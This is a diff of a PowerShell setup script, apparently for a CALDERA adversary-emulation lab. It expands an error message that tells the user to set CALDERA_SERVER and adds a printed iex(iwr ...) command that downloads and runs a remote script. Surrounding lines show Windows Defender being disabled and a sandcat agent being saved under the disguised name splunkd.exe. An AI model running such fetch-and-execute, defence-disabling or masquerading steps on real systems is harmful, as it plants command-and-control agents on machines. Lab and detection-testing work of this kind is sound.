@@ -31,7 +31,21 @@ Write-Host "[+] Defender disabled." -ForegroundColor Green
 
 # Step 4: Deploy CALDERA sandcat agent
 Write-Host "[*] Deploying sandcat agent..." -ForegroundColor Cyan
-if (-not $env:CALDERA_SERVER) { Write-Host "[!] Set CALDERA_SERVER env var first. Example: `$env:CALDERA_SERVER='192.168.1.100'" -ForegroundColor Red; exit 1 }
+if (-not $env:CALDERA_SERVER) {
+    Write-Host "" -ForegroundColor Red
+    Write-Host "[!] CALDERA_SERVER environment variable is not set." -ForegroundColor Red
+    Write-Host "" -ForegroundColor Red
+    Write-Host "    Set it to your Docker host IP before running this script:" -ForegroundColor Yellow
+    Write-Host '    $env:CALDERA_SERVER = "192.168.1.100"' -ForegroundColor Cyan
+    Write-Host "" -ForegroundColor Yellow
+    Write-Host "    Then re-run:" -ForegroundColor Yellow
+    Write-Host "    powershell -c `"iex(iwr 'http://<host-ip>:8081/s.ps1' -UseBasicParsing)`"" -ForegroundColor Cyan
+    Write-Host "" -ForegroundColor Red
+    Write-Host "    To find your Docker host IP, run on the host:" -ForegroundColor Yellow
+    Write-Host "    ipconfig (Windows) or ifconfig/ip addr (macOS/Linux)" -ForegroundColor Cyan
+    Write-Host "" -ForegroundColor Red
+    exit 1
+}
 $server = "http://$($env:CALDERA_SERVER):8888"
 $url    = "$server/file/download"
 $dest   = "C:\Users\Public\splunkd.exe"
